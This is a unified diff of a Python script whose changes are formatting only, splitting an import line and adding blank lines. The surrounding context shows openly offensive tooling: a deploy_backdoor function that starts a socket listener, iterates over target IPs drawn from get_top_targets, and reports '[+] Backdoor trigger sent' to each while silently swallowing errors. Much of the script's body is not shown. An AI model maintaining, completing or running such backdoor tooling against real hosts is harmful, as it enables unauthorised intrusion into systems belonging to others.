@@ -1,5 +1,9 @@
-import socket, threading, time
+import socket
+import threading
+import time
+
 from memory_engine import get_top_targets
+
 
 def ephemeral_listener():
     s = socket.socket()
@@ -16,6 +20,7 @@ def ephemeral_listener():
         pass
     s.close()
 
+
 def deploy_backdoor():
     threading.Thread(target=ephemeral_listener).start()
     time.sleep(2)
@@ -29,6 +34,7 @@ def deploy_backdoor():
             print(f"[+] Backdoor trigger sent to {ip}")
         except:
             pass
+
 
 if __name__ == "__main__":
     deploy_backdoor()
